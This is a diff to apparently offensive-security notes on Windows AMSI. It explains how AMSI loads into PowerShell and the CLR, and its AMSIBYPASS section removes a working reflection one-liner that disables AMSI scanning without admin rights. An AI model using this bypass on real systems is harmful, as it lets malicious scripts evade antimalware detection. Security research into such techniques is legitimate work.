@@ -1,6 +1,6 @@
 # AMSI (Anti-Malware Scanning Interface)
 
-> WARNING : Amsi loads into powershell, with dotner amsi integrates with the clr which loads AMSI on demand.
+> WARNING : Amsi.dll is loaded into every powershell.exe process, but when running dotnet (csharp) binaries, amsi integrates directly with the clr which loads AMSI on demand. Amsi Bypasses that work in powershell don't necessariy work for the CLR integration.
 
 AmsiScanBuffer
 AmsiScanString
@@ -90,12 +90,6 @@ $dotnet.GetName().Version
 
 ![image](./images/dotnetversion.jpg)
 
-Check Powershell installed on the system:
-
-```yaml
-(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
-```
-
 AMSITEST
 ---
 
@@ -114,13 +108,7 @@ It '"Antimalware Scan Interface" is working' {
 AMSIBYPASS
 ---
 
-Works on 1803 and before
-
 > This bypass does not require administrator rights!!!
-
-```yaml
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, Static').SetValue($null,$true)
-```
 
 Works on 1903, 1909 and before
 
